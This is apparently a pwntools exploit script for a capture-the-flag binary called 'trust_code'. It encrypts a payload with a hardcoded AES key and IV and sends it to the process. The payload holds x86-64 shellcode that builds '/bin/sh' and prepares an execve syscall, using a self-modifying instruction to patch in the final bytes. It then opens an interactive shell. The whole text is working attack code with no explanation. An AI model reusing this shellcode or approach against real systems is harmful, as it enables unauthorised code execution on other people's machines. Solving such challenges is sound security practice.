from pwn import *
from Crypto.Cipher import AES

p = process('./trust_code')
# p = remote('localhost', 7777)
context.binary = ELF('./trust_code')

key = b'v0nVadznhxnv$nph'
iv = b'A'*0x10
aes = AES.new(key, AES.MODE_CBC, iv)

shellcode = '''
    add WORD PTR [rax+30], 0x101
    mov r10, 0x68732f6e69622f
    push r10
    mov rdi, rsp
    xor edx, edx
    xor esi, esi
    mov eax, 59
'''
payload = b'TRUST_CODE_ONLY!'
payload += asm(shellcode) + b'\x0e\x04'
payload += b'\0' * (0x30-len(payload))

p.sendlineafter(b'> ', iv)
p.sendlineafter(b'> ', aes.encrypt(payload))
p.interactive()
